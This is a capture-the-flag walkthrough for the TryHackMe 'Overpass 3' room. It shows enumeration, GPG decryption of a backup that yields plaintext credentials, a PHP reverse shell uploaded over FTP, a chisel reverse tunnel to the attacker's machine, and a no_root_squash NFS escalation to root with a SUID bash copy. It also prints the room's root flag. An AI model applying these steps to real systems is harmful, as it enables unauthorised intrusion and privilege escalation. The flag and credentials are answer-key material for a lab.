# 61 - Overpass 3 - Hosting (GPG, no\_root\_squash exploitation)

Room Link --> [https://tryhackme.com/room/overpass3hosting](https://tryhackme.com/room/overpass3hosting)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.184.170 -sV -p-

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack Apache httpd 2.4.37 ((centos))
```
{% endcode %}

Source code of the main page.

<figure><img src=".gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.184.170 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -b 403,404

/backups
```
{% endcode %}

We see a `backup.zip` file there, download and analyze it.

<figure><img src=".gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

There is a .gpg key and an excel document encrypted with gpg.

The archive contains an encrypted spreadsheet and a GPG key, using the GPG tool to import the key and decrypt the spreadsheet:

<figure><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/05/image-267.png?w=800&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>

```bash
# credentials
paradox : ShibesAreGreat123
0day : OllieIsTheBestDog
murilandoracle : A11D0gsAreAw3s0me
```

We login as `paradox` .

<figure><img src=".gitbook/assets/image (403).png" alt=""><figcaption></figcaption></figure>

### Initial Access

Seems paradox folder hosts the main webpage.

Meaning we can upload mailicious php file and upload via ftp and get reverse shell.

<figure><img src=".gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>

And we got a shell as `apache` user.

<figure><img src=".gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

The first flag can then be identified by searching for web or flag through the find command:

```bash
find / -name web* 2>/dev/null
```

<figure><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/05/image-277.png?w=800&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

We can use Paradox ftp passowd to switch to his account: `su paradox` .

SO i added my ssh pub key into paradox ssh authorized\_keys file, so i could ssh with my private key for aa stable shell.

### Priv Esc to James

Transfer LinPEAS.sh to the victim box.

It appears that there is a NFS share connected to /home/james and the “no\_root\_squash” NFS setting is enabled:

<figure><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/05/image-281.png?w=800&#x26;ssl=1" alt=""><figcaption></figcaption></figure>

```bash
[paradox@localhost ~]$ cat /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

This means the `/home/james` dir is sharable and mountable and even writable because of the `no_root_squash` . Meaning we can mount it on kali then upload a malicious file to gain access to the James user.

Now, NFS (2049) is not open externally but is open internally.

We can port forward it so  it can be available in our kali,  i will use chisel.

{% code overflow="wrap" %}
```bash
┌──(dking㉿dking)-[/opt]
└─$ ./chisel_1.9.1_linux_amd64 server --port 9001 --reverse

# on victim
[paradox@localhost ~]$ ./chisel_1.9.1_linux_amd64 client 10.18.88.214:9001 R:2049:127.0.0.1:2049

```
{% endcode %}

<figure><img src=".gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>

When we mount `/home/james` - we get an error, but if we mount `/` - it works.

```bash
┌──(root㉿dking)-[~]
└─# sudo mount -t nfs 127.0.0.1:/home/james /mnt/home
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /lib/systemd/system/rpc-statd.service.
mount.nfs: mounting 127.0.0.1:/home/james failed, reason given by server: No such file or directory

# mounting / works
┌──(root㉿dking)-[~]
└─# sudo mount -t nfs 127.0.0.1:/ /mnt/home  
                                                                                                                
┌──(root㉿dking)-[~]
└─# cd /mnt/home && ls -al     
total 20
drwx------ 3 dking dking  112 Nov 17  2020 .
drwxr-xr-x 5 root  root  4096 Nov  7 10:33 ..
lrwxrwxrwx 1 root  root     9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r-- 1 dking dking   18 Nov  8  2019 .bash_logout
-rw-r--r-- 1 dking dking  141 Nov  8  2019 .bash_profile
-rw-r--r-- 1 dking dking  312 Nov  8  2019 .bashrc
drwx------ 2 dking dking   61 Nov  8  2020 .ssh
-rw------- 1 dking dking   38 Nov 17  2020 user.flag

```

So we get the user.flag.

### Priv Esc to root

Since we have the `no_root_squash` privs.

We can copy /bin/bash into a file chown to root and add SUID bits from our kali, then we execute on James ssh session.

{% code overflow="wrap" %}
```bash
# from james ssh session
[james@localhost ~]$ cp /bin/bash bash
[james@localhost ~]$ ls
bash  user.flag
[james@localhost ~]$ ./bash -p
bash-4.4# cd /root
bash-4.4# ls
root.flag
bash-4.4# cat root.flag 
thm{a4f6adb70371a4bceb32988417456c44}
bash-4.4# 


# from kali NFS session
┌──(root㉿dking)-[/mnt/home]
└─# ls    
bash  user.flag
                                                                                                                
┌──(root㉿dking)-[/mnt/home]
└─# chown root:root bash    
                                                                                                                
┌──(root㉿dking)-[/mnt/home]
└─# chmod 777 bash && chmod +s bash
                                                                                                                
┌──(root㉿dking)-[/mnt/home]
└─# ls
bash  user.flag
```
{% endcode %}

<figure><img src=".gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

Done!

